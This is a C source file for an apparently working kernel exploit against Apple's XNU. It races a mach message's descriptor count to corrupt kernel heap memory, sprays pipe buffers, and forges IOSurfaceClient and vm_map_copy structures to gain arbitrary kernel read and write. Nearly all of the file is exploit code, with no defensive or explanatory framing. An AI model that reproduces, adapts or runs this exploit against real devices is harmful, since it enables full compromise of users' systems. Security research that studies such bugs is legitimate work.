//
//  exploit.c
//  kmsg_bug
//
//  Created by Jake James on 3/2/22.
//

#include "exploit.h"
#include <pthread/pthread.h>
#include "exploit_utilities.h"
#include "IOSurface_stuff.h"
#include "spray.h"
#include "piper.h"

#include "ENABLE_HELPER.h"

#if ENABLE_HELPER
#include "helper/proc.h"
#include "helper/find_port.h"
#include "helper/kextrw.h"
#include "helper/offsets.h"
#include "helper/find_IOSurface.h"
#include "helper/find_pipe.h"

extern uint64_t gKernelSlide, gKernelBase;
#endif

#define DEBUG 0

int surfaces[2][4096] = {0};
io_service_t IOSRUC[2] = {0};

int IOSurface_setCapacity_0x2000() {
    kern_return_t ret = _host_page_size(mach_host_self(), (vm_size_t*)&pagesize);
    if (ret) {
        printf("[-] Failed to get page size! 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    
    io_connect_t IOSurfaceRoot = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!MACH_PORT_VALID(IOSurfaceRoot)) {
        printf("[-] Failed to find IOSurfaceRoot service\n");
        return KERN_FAILURE;
    }
    
    ret = IOServiceOpen(IOSurfaceRoot, mach_task_self(), 0, &IOSRUC[0]);
    if (ret || !MACH_PORT_VALID(IOSRUC[0])) {
        printf("[-] Failed to open IOSRUC: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    
    ret = IOServiceOpen(IOSurfaceRoot, mach_task_self(), 0, &IOSRUC[1]);
    if (ret || !MACH_PORT_VALID(IOSRUC[1])) {
        printf("[-] Failed to open IOSRUC: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    
    struct IOSurfaceFastCreateArgs create_args = {
        .alloc_size = pagesize
    };
    
    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = 0xf60;
    
    for (int i = 0; i < 4096; i++) {
        ret = IOConnectCallMethod(IOSRUC[0], IOSurfaceRootUserClient_create_surface_selector, NULL, 0, &create_args, sizeof(create_args), NULL, NULL, &lock_result, &lock_result_size);
        if (ret) {
            printf("[-] Failed to create IOSurfaceClient: 0x%x (%s)\n", ret, mach_error_string(ret));
            return ret;
        }
    
        surfaces[0][i] = lock_result.surface_id;
    }
    
    for (int i = 0; i < 4096; i++) {
        release_IOSurface(IOSRUC[0], surfaces[0][i]);
        surfaces[0][i] = 0;
    }
    
    for (int i = 0; i < 4096; i++) {
        ret = IOConnectCallMethod(IOSRUC[1], IOSurfaceRootUserClient_create_surface_selector, NULL, 0, &create_args, sizeof(create_args), NULL, NULL, &lock_result, &lock_result_size);
        if (ret) {
            printf("[-] Failed to create IOSurfaceClient: 0x%x (%s)\n", ret, mach_error_string(ret));
            return ret;
        }
#if DEBUG
        printf("[i] Surface id: %d\n", lock_result.surface_id);
#endif
        surfaces[1][i] = lock_result.surface_id;
        
        if (surfaces[1][i] == 8100) break;
    }
    
    return 0;
}

void release_all() {
    for (int i = 0; i < 4096; i++) {
        if (surfaces[1][i]) {
            printf("[*] Releasing %d\n", surfaces[1][i]);
            fflush(stdout);
            usleep(10);
            release_IOSurface(IOSRUC[1], surfaces[1][i]);
        }
    }
}

// N_DESC = 14 and N_CORRUPTED = 1014 will make a message have 0x4000 size
// (there are other combinations however for some reason ones where difference is lower don't work?)

#define N_DESC 14
#define N_CORRUPTED 1014

// how many pipes to spray
#define N_SPRAY 900

// size of each pipe buffer
#define KALLOC_SIZE 0x4000

// size of ool buffer
#define OOL_SIZE 0x100
#define BIG_BUFFER_SIZE 0x10000

struct exp_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
    mach_msg_ool_descriptor_t ool_desc[N_CORRUPTED - 1];
};

struct exp_msg msg;

void race_thread() {
    while (1) {
        // continue;
        // change the descriptor count back and forth
        // eventually the race will work just right so we get this order of actions:
        // count = N_DESC -> first copyin -> count = N_CORRUPTED -> second copyin
        msg.body.msgh_descriptor_count = N_CORRUPTED;
        msg.body.msgh_descriptor_count = N_DESC;
    }
}

void *fake_IOSC;
void *fake_IOS;
void *gBuf;
uint64_t gBuf_kspace = KHEAP_DATA_MAPPABLE_LOC;
int rfd; 
int wfd;

uint64_t ool_ports_buffer = 0;
uint64_t IOSC_array = 0;

int opipe[2] = {0};

mach_port_t dest;

// these are racy, should put locks, but this is just an exploit, so idc
uint32_t rk32(uint64_t addr) {
    read(rfd, gBuf, 0x4000);
    *(uint64_t*)(fake_IOSC + 0x40) = addr - 0xb4;
    write(wfd, gBuf, 0x4000-1);

    uint32_t val;
    int ret = IOSurface_get_ycbcrmatrix(IOSRUC[1], surfaces[1][0], &val);

    read(rfd, gBuf, 0x4000);
    *(uint64_t*)(fake_IOSC + 0x40) = (uint64_t)fake_IOS;
    write(wfd, gBuf, 0x4000-1);
    
    if (ret) {
        printf("[-][rk32] Error get_ycbcrmatrix: %s\n", mach_error_string(ret));
        return 0;
    }
    return val;
}

uint64_t rk64(uint64_t addr) {
    uint32_t val1 = rk32(addr);
    uint64_t val2 = rk32(addr + 4);
    uint64_t val64 = val1 | (val2 << 32);
    return val64;
}

int wk64(uint64_t addr, uint64_t what) {
    read(rfd, gBuf, 0x4000);
    *(uint64_t*)(fake_IOS + 0x358) = addr;
    write(wfd, gBuf, 0x4000-1);

    int ret = IOSurface_set_indexed_timestamp(IOSRUC[1], surfaces[1][0], 0, what);

    read(rfd, gBuf, 0x4000);
    *(uint64_t*)(fake_IOS + 0x358) = (uint64_t)fake_IOS + 0x1000;
    write(wfd, gBuf, 0x4000-1);

    if (ret) {
        printf("[-][wk64] Error set_indexed_timestamp: %s\n", mach_error_string(ret));
        return ret;
    }
    return 0;
}

void after_thread(int *pipefds) {
    // wait a little bit
    sleep(1);

    // which pipefd are we using on?
    int pipe_count = N_SPRAY;
    for(int i = 0; i < pipe_count; i++) {
        read(pipefds[2 * i], gBuf, 0x4000);
        *(uint64_t*)((gBuf + 0x2000) + 0x40) = (gBuf_kspace + 0x4000-0x10) - 0xb4;  //gBuf + 0x2000 = fake_IOSC; will read from (gBuf_kspace + 0x4000-0x10)
        *(uint16_t *)(gBuf + 0x4000 - 0x10) = pipefds[2 * i];   //to determine which pipefd will be used for krw
        *(uint16_t *)(gBuf + 0x4000 - 0x10 + 2) = pipefds[2 * i + 1];   //to determine which pipefd will be used for krw
        write(pipefds[2 * i + 1], gBuf, 0x4000-1);
    }
    uint32_t pipefd_leak;
    int ret = IOSurface_get_ycbcrmatrix(IOSRUC[1], surfaces[1][0], &pipefd_leak);
    rfd = pipefd_leak & 0xffff;
    wfd = (pipefd_leak >> 16) & 0xFFFF;
    printf("[i] pipefd_leak = 0x%x, rfd = 0x%x, wfd = 0x%x\n", pipefd_leak, rfd, wfd);

    //restore
    for(int i = 0; i < pipe_count; i++) {
        read(pipefds[2 * i], gBuf, 0x4000);
        *(uint64_t*)((gBuf + 0x2000) + 0x40) = (uint64_t)(gBuf_kspace+0x3000);
        write(pipefds[2 * i + 1], gBuf, 0x4000-1);
    }

    uint64_t kptr = KHEAP_DATA_MAPPABLE_LOC + 0x4000 - 0x20;
    wk64(kptr, 0x4142434445464748);
    printf("[i] Wrote: 0x%llx\n", 0x4142434445464748);
    printf("[i] Read back: 0x%llx -> 0x%llx\n", kptr, rk64(kptr));
    printf("[i] done, spinning here!");
    while(1) {};
}

void hexdump64(uint64_t addr, size_t size) {
    void *data = malloc(size);
    if (!data) return;
    memcpy((void*)data, (void*)addr, size);

    size_t offset;
    for (offset = 0; offset < size; offset += 16) {
        uint64_t v1 = 0, v2 = 0;
        size_t rem = size - offset;

        size_t n1 = rem >= 8 ? 8 : rem;
        if (n1)
            memcpy(&v1, (unsigned char*)data + offset, n1);

        if (rem > 8) {
            size_t n2 = (rem - 8) >= 8 ? 8 : (rem - 8);
            memcpy(&v2, (unsigned char*)data + offset + 8, n2);
        }

        printf("0x%016llx: 0x%016llx 0x%016llx\n",
               (unsigned long long)(addr + offset),
               (unsigned long long)v1,
               (unsigned long long)v2);
    }

    free(data);
}

uint64_t surfClients = 0;
void exploit() {
#if ENABLE_HELPER
    if(kextrw_init() != 0) {
        printf("kextrw_init() failed!\n");
        while(1) {};
    }
    kextrw_get_kernel_base();
    offsets_init();
    
    // goto TEST;

#endif

    printf("[*] Setting up exploit\n");
    
    IOSurface_setCapacity_0x2000();
#if ENABLE_HELPER
    uint64_t surfRoot = port_to_kobject(IOSRUC[1]);
    printf("surfRoot: 0x%llx\n", surfRoot);
    surfClients = kextrw_kread64(surfRoot + 0x118);
	printf("surfClients: 0x%llx\n", surfClients);
#endif
    
    // allow us to spray a lot of pipes
    increase_file_limit();
    
    // ool buffer
    void* buf = calloc(1, OOL_SIZE * N_DESC);
    
    void *ports = calloc(1, BIG_BUFFER_SIZE/2); // size of a port in userland is half its size in kernel
    
    // set up the message
    msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg.hdr.msgh_size = (mach_msg_size_t)(sizeof(struct exp_msg));
    msg.hdr.msgh_remote_port = 0;
    msg.hdr.msgh_local_port = MACH_PORT_NULL;
    msg.hdr.msgh_id = 0x12341234;
    
    // set the initial (smaller) descriptor count
    msg.body.msgh_descriptor_count = N_DESC;
    
    // ool ports descriptor
    msg.ool_ports.address = ports;
    msg.ool_ports.count = BIG_BUFFER_SIZE / 8;
    msg.ool_ports.deallocate = 0;
    msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg.ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    msg.ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
    
    // ool descriptors
    for (int i = 0; i < N_DESC - 1; i++) {
        msg.ool_desc[i].address = buf + i * OOL_SIZE;
        msg.ool_desc[i].size = OOL_SIZE;
        msg.ool_desc[i].deallocate = 0;
        msg.ool_desc[i].type = MACH_MSG_OOL_DESCRIPTOR;
        msg.ool_desc[i].copy = MACH_MSG_PHYSICAL_COPY;
    }
    
    // original writeup uses a mach message for this, but we'd have to fix up the trailer to avoid breaking its signature, also pipes allow us to write back without reallocating
    printf("[*] Spraying pipe buffers\n");
    size_t pipe_count = N_SPRAY;
    void *pipe_buf = calloc(1, KALLOC_SIZE);
    memset(pipe_buf, 0, KALLOC_SIZE);
    int *pipefds = create_pipes(&pipe_count);
    pipe_spray(pipefds, pipe_count, pipe_buf, KALLOC_SIZE, NULL);
    

    // -----------+-----------+-----------+------------+-----------
    //    pipe1   |   pipe2   |    ...    |  pipe5000  |
    // -----------+-----------+-----------+------------+-----------
    //
    
    // poke some holes to increase chance of landing right after a pipe
    printf("[*] Poking holes\n");
    fflush(stdout);

    for(int i = 0; i < pipe_count; i++) {
        if (i % 64 == 0) {
#if ENABLE_HELPER
            printf("[*] Freed pipe kaddr = 0x%llx, i = %d\n", obtain_pipe_kaddr(pipefds[2 * i]), i);
#endif
            close(pipefds[2 * i]);
            close(pipefds[2 * i + 1]);
            pipefds[2 * i] = 0;
            pipefds[2 * i + 1] = 0;
        }
    }
  
    // -----------+-----------+-----------+------------+------------+------------+-----------
    //    pipe1   |   pipe2   |    ...    |   pipe64   |    FREE    |   pipe67   |    ...
    // -----------+-----------+-----------+------------+------------+------------+-----------
    //
    
    printf("[*] Racing\n");
    
    // more reliability voodoo
    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);
    // start the threads
    pthread_t thread;
    pthread_create(&thread, &pattr, (void*)race_thread, NULL);

    // try up to 100000 times
    for (int i = 0; i < 100000; i++) {

        // create a mach port where we'll send the message
        dest = new_mach_port();
    
        // send
        msg.hdr.msgh_remote_port = dest;
        int ret = mach_msg_send(&msg);
        if (ret) printf("error: %s\n", mach_error_string(ret));

        #if ENABLE_HELPER
        printf("Allocated kmsg, ikm_header = 0x%llx, i = %d\n", xpaci(find_kmsgdata_from_port(msg.hdr.msgh_remote_port)), i);
        #endif
        // getchar();
        // continue;
    
        // hopefully (pre-trigger):
        // -----------+-----------+-----------+-----------+------------+-------------+-----------
        //    pipe1   |   pipe2   |    ...    |   pipeN   | ikm_header |   pipeN+2   |    ...
        // -----------+-----------+-----------+-----------+------------+-------------+-----------
        
        // after bug trigger pipeN should overlap with ikm_header:
        
        //                                            +----------------+
        //                                            |                |
        // -----------+-----------+-----------+-----------+            +-------------+-----------
        //    pipe1   |   pipe2   |    ...    |   pipeN   | ikm_header |   pipeN+2   |    ...
        // -----------+-----------+-----------+-----------+------------+-------------+-----------
       
        
        // check if we overwrote one of the pipe buffers
        for (int i = 0; i < pipe_count; i++) {
            if (pipefds[i * 2] && pipefds[i * 2] != opipe[0]) {;
                ssize_t ret = read(pipefds[i * 2], pipe_buf, KALLOC_SIZE);
                if (ret == -1) {
                    printf("[-] Failed to read pipe: %s\n", strerror(errno));
                    continue;
                }
   
                // there seem to be some extra 56 bytes between the two
                int off = KALLOC_SIZE - 4 * (N_CORRUPTED - N_DESC) + 56;
                
                if (*(uint32_t*)(pipe_buf + off) == 0x80000011) {
                    printf("[+] Found ikm_header at pipe nr. %d\n", i);
                    struct ool_kmsg *kmsg = pipe_buf+off;
                    
#if DEBUG
                    for (int i = 0; i < N_DESC; i++) {
                        uint64_t kaddr = (uint64_t)kmsg->ool_messages[i].address;
                        printf("[i] 0x%llx\n", kaddr);
                    }
#endif
                     
                    ool_ports_buffer = (uint64_t)kmsg->ool_messages[0].address;
                    
                    // assume this scenario is true and hope for the best
                    IOSC_array = ool_ports_buffer - BIG_BUFFER_SIZE;
                    
                    // save the pipe
                    opipe[0] = pipefds[i * 2];
                    opipe[1] = pipefds[i * 2 + 1];
                    
                    pipefds[i * 2] = 0;
                    pipefds[i * 2 + 1] = 0;
                    
                    // close other pipes
                    for (int i = 0; i < N_SPRAY; i++) {
                        if (pipefds[i * 2]) close(pipefds[i * 2]);
                        if (pipefds[i * 2 + 1]) close(pipefds[i * 2 + 1]);
                    }
                    
                    printf("[+] Leaked ool ports buffer: 0x%llx\n", ool_ports_buffer);
                    printf("[+] Calculated IOSurfaceClient array address: 0x%llx\n", IOSC_array);
#if ENABLE_HELPER
                    printf("[!] orig surfClients: 0x%llx\n", surfClients);
#endif
                    
                    gBuf = calloc(1, 0x4000); // need to calculate on A10+
                    memset(gBuf, 0, 0x4000);

                    pipe_count = 900;
                    pipefds = create_pipes(&pipe_count);
                    pipe_spray(pipefds, pipe_count, gBuf, 0x4000, NULL);
                    for(int i = 0; i < pipe_count; i++) {
                        read(pipefds[2 * i], gBuf, 0x4000);
                    }

#if ENABLE_HELPER && PROFILLING_KHEAP_DATA_BUFFERS
                    for(int i = 0; i < pipe_count; i++) {
                        uint64_t kspace = obtain_pipe_kaddr(pipefds[2 * i]);
                        printf("[*] kspace; Allocated pipe kaddr = 0x%llx, rfd = 0x%llx\n", kspace, pipefds[2 * i]);
                    }
#endif

                    struct vm_map_copy *copy = gBuf;
                    struct vm_map_links *entry = gBuf + 0x1000;
                    
                    copy->type = VM_MAP_COPY_ENTRY_LIST; // we need the entry list type
                    copy->c_u.hdr.nentries = 1; // doesn't really matter
                    copy->c_u.hdr.links.next = (struct vm_map_entry*)(gBuf_kspace+0x1000); // the fake entry
                    *(uint64_t*)(((uint64_t)&copy->c_u.hdr) + 0x28) = 0xffffffffbaadc0d1; // do this to skip some useless code
                    
                    fake_IOSC = gBuf + 0x2000; // fake IOSurfaceClient
                    fake_IOS = gBuf + 0x3000; // fake IOSurface
                    
                    *(uint64_t*)(fake_IOS + 0x358) = (uint64_t)(gBuf_kspace+0x2000) + 0x1000; // fake timestamp array = fake ycbcrmatrix array
                    *(uint64_t*)(fake_IOSC + 0x40) = (uint64_t)(gBuf_kspace+0x3000);
                    
                    
                    void *vm_object = gBuf + 0x3000;
                    *(uint8_t*)(vm_object + 0xa) = 0x40; // lock stuff
                    *(uint32_t*)(vm_object + 0x28) = 2; // something that needs to be 2 for it to work
                    *(uint64_t*)(vm_object + 0x48) = 0x1337; // needs to be non-zero
                    *(uint32_t*)(vm_object + 0x74) = 0x8000000; // needs to be this
                    *(uint32_t*)(vm_object + 0xa4) = 0x400; // mapping_in_progress = 1
                    
                    entry->prev = (void *)(gBuf_kspace+0x2000);
                    entry->next = (void *)(IOSC_array + surfaces[1][0] * 8);
                    *(uint64_t*)((uint64_t)entry + 0x38) = (uint64_t)(gBuf_kspace + 0x3000); // the fake vm_object
                    *(uint64_t*)((uint64_t)entry + 0x48) = 0; // needs to be 0
                    
                    printf("[*] Writing fake vm_map_copy ptr\n");
                    kmsg->ool_messages[1].address = (uint64_t)gBuf_kspace;

                    for(int i = 0; i < pipe_count; i++) {
                        ret = write(pipefds[2 * i + 1], gBuf, 0x4000-1);
                    }

                    ret = write(opipe[1], pipe_buf, KALLOC_SIZE);
                    printf("[*] Wrote fake vm_map_copy ptr, ret = 0x%x\n", ret);
                    
                    pthread_t thread;
                    pthread_create(&thread, NULL, (void*)after_thread, (void*)pipefds);
                   
                    /*
                     this will basically do:
                        entry->next->prev = entry->prev;
                        entry->prev->next = entry->next;
                     
                     and then it'll hang until mapping_in_progress is unset
                    */
                    printf("[*] Writing fake IOSurfaceClient ptr\n");
                    mach_port_destroy(mach_task_self(), dest);
                    
                    printf("[-] Exploit failed\n");
                    return;
                }
                
                memset(pipe_buf, 0, KALLOC_SIZE);
                write(pipefds[i * 2 + 1], pipe_buf, KALLOC_SIZE - 1);
            }
        }
        
        // if bug didn't work, free message and try again
        // if bug worked but pipes weren't affected then we corrupted something else, let this just panic
        // mach_msg_receive(&msg);
        mach_port_destroy(mach_task_self(), dest);
    }
    
    printf("[-] Exploit failed\n");
    return;

TEST:
    // printf("ourProc: 0x%llx\n", proc_of_pid(getpid()));

#if ENABLE_HELPER
    kextrw_deinit();
#endif
    return;
}